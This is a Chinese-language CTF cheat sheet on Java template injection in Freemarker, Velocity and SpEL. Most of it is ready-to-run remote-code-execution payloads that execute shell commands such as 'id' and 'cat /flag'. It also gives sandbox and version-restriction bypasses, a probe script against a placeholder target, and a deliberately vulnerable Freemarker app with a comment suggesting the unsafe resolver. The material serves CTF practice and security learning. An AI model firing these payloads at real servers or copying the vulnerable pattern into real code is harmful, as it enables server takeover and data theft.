---
title: Java 模板注入进阶：Freemarker / Velocity / SpEL 执行链
category: web
tags: [ssti, freemarker, velocity, spel, java]
signals:
  - "输入被渲染后 ${7*7} 直接回显 49"
  - "报错栈出现 freemarker.template.TemplateException"
  - "报错栈出现 org.apache.velocity 或 VelocityEngine"
  - "参数被 @Value 或 SpelExpressionParser 求值"
  - "页面模板文件名形如 .ftl 或 .vm"
  - "用户可自定义邮件模板或报表模板"
  - "题面提示词出现 Freemarker / Velocity / SpEL / 表达式注入"
  - "返回内容里出现 FreeMarker template error"
  - "存在 /actuator/gateway 之类的 Spring 端点"
difficulty: hard
source: "PortSwigger / PayloadsAllTheThings / Synack"
tools: [burpsuite, python, java]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 用户输入被模板渲染：`${7*7}` → 49（Freemarker / SpEL），`#set($x=7*7)$x` → 49（Velocity）。
- 报错栈：`freemarker.core.InvalidReferenceException`、`org.apache.velocity.exception.ParseErrorException`、`org.springframework.expression.spel.SpelEvaluationException`。
- 页面有"邮件模板"、"通知书模板"、"报表模板"编辑功能。
- 路径 `/actuator/env`、`/actuator/gateway` 出现（SpEL 常见落点）。
- 题面提示：`模板注入`、`Freemarker`、`Velocity`、`SpEL`、`Spring`。
- 报错里出现 `TemplateSyntaxError`、`FreeMarker template error`。
- 已确认能注入，但 Java 沙箱/`SecurityManager` 限制类加载。

## 二、原理

### 1. Freemarker（`${...}` + `<#...>`）

Freemarker 内置 `?new()`，可以实例化**任何实现了 `TemplateModel` 的类**。最经典的 RCE：

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

`Execute` 是 Freemarker 自带的 `TemplateMethodModelEx`，`?new()` 直接给它构造 → `ex("id")` 执行命令。

其它类：`freemarker.template.utility.ObjectConstructor`（能 new 任意类，`?api` 需要开启）、`freemarker.template.utility.JythonRuntime`（需 Jython）。

**2.3.30+ 修复**：`?new()` 被限制为只允许 `TemplateModel` 且部分类被拉黑，需要 `Configuration.setNewBuiltinClassResolver(...)`。绕过思路：`?api` 打开时用 `ObjectConstructor`，或找白名单里的 gadget。

### 2. Velocity（`#set` / `$class` / `#evaluate`）

Velocity 的老 payload 利用 `$class.inspect()`：

```velocity
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

Velocity 2.x 默认不允许 `class` 方法调用，需要 `introspector` 配置。新版策略：找 `Runtime` 之外的 `ProcessBuilder` 路径，或用 `#evaluate` 执行已缓存的模板。

### 3. SpEL（Spring Expression Language）

SpEL 常见于 `@Value("#{...}")`、`@PreAuthorize`、`SpelExpressionParser.parseExpression(userInput)`：

```java
// 基础
T(java.lang.Runtime).getRuntime().exec("id")

// 需要 String 结果时
new String(T(java.lang.Runtime).getRuntime().exec(new String[]{"sh","-c","id"}).getInputStream().readAllBytes())
```

Spring Cloud Gateway 的 CVE-2022-22947 是 SpEL 注入的典型（`/actuator/gateway/routes` 里塞 SpEL）。

## 三、解题步骤

1. **判断引擎**：
   - `${7*7}` → 49：Freemarker 或 SpEL
   - `<#assign>` 生效：Freemarker
   - `#set($a=7*7)$a` → 49：Velocity
   - `#{7*7}` → 49：Spring EL
2. **看回显**：payload 执行 `id` 是否直接回显（`Execute` 是同步的，会回显）。
3. **无回显**：用 `curl` 外带或写文件到 web 目录。
4. **沙箱绕过**：Java 17 下 `Runtime.exec` 可用，但 `SecurityManager`/模块限制下可能被拒 → 改用 `ProcessBuilder`、`ScriptEngineManager`。
5. **Spring 场景**：确认有无 `/actuator`，走 SpEL 网关注入。

## 四、可直接运行的脚本

Freemarker 最小靶：

```java
// App.java —— 漏洞点：把用户输入当模板
import freemarker.template.*;
import java.io.*;
import java.util.*;

public class App {
    public static void main(String[] a) throws Exception {
        Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);
        cfg.setTemplateExceptionHandler(TemplateExceptionHandler.RETHROW_HANDLER);
        // 关键：默认 newBuiltinClassResolver = UNRESTRICTED，2.3.30+ 需显式放宽
        cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER); // 试试换成 UNRESTRICTED
        Template t = new Template("t", a[0], cfg);
        t.process(new HashMap<>(), new OutputStreamWriter(System.out));
    }
}
```

Freemarker 一次性 payload：

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("cat /flag") }
```

Freemarker 无回显时写文件：

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("sh -c 'id > /tmp/o.txt'") }
```

Velocity payload（`$class` 版本，需 introspector）：

```velocity
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("cat /flag"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

SpEL payload（一行版，适合塞进 `@Value` 或参数）：

```java
#{T(java.lang.Runtime).getRuntime().exec("id")}
```

SpEL 带回显（用 `readAllBytes`）：

```java
#{new String(T(java.lang.Runtime).getRuntime().exec(new String[]{"sh","-c","cat /flag"}).getInputStream().readAllBytes())}
```

SpEL 探测脚本（判断是否被求值）：

```python
import requests

URL = "http://TARGET/render"
probes = ["${7*7}", "#{7*7}", "<#assign x=7*7>${x}", "#set($x=7*7)$x", "%{7*7}"]
for p in probes:
    r = requests.post(URL, data={"tpl": p}, timeout=10)
    print(repr(p), "->", r.status_code, r.text[:120].replace("\n", " "))
```

## 五、常见坑 / 变体

- **Freemarker 2.3.30+ 拒 `?new()`**：先试 `?new()`，报 `Instantiating free marker classes is not allowed` 就转 `?api`（需 `api_builtin_enabled=true`）或 `ObjectConstructor`。
- **Velocity 2.x 禁 `$class`**：改用 `#evaluate` 绕过或 `$request` 对象。
- **SpEL 直接回显很难**：`exec` 返回 `Process`，toString 不友好 → 必须 `readAllBytes`。
- **`T()` 在 Spring Boot 3 被禁**：Spring Framework 6 收紧 `T()`，需走 `TypeLocator` 绕。
- **`SecurityManager`**：Java 17 默认无，但部分容器开了 → 抓 `AccessControlException` 换 gadget。
- **变体：Thymeleaf** —— `__${...}__` 预处理器，`${T(...)}` 二次求值。
- **变体：JSP EL** —— `${''.getClass().forName('java.lang.Runtime')}`，需 EL 3.0。
- **变体：Spring Cloud Gateway CVE-2022-22947** 走 SpEL。
- **变体：邮件模板**（`JavaMailSender` 渲染 Freemarker）→ payload 在邮件里回显，需读邮件。

## 六、参考来源

- [PortSwigger — Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- [PayloadsAllTheThings — SSTI Java](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md)
- [Synack — Discovering SSTI in FreeMarker](https://www.synack.com/exploits-explained/exploits-explained-discovering-a-server-side-template-injection-vuln-in-freemarker/)
- [Apache FreeMarker 官方文档](https://freemarker.apache.org/docs/)
- [Spring — SpEL Reference](https://docs.spring.io/spring-framework/reference/core/expressions.html)
- [HackTricks — SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
